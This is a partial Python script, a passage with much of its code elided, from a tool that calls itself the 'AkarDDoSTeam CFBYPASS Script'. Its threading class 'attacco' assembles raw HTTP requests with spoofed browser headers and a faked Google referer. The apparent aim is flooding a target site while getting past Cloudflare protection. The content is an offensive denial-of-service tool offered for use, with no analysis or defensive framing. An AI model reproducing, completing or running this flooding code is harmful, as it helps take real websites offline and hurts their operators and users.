...
class attacco(threading.Thread):
    def run(self):
        ...
        contype = "Content-Type: text/html; charset=UTF-8\r\n"
        conlenght = "Content-Length: 1024\r\n"
        insecure = "upgrade-insecure-requests: 1\r\n"
        accept2="accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
        referer="referer: https://www.google.com/?q=" + host_url + "\r\n"
        accept_language="accept-language: en-US,en;q=0.9\r\n"
        cache_control="cache-control: max-age=0\r\n"
        origin="origin: " + host_url + "\r\n"

        httprequest = get_host + useragent + accept + contype + insecure + accept2 +  accept_language + cache_control + origin + referer + forward + connection + "\r\n"
...
# grafica varia
print("          [+] AkarDDoSTeam CFBYPASS Script [+]")
print("          [+] Creator By Winchester [+]")
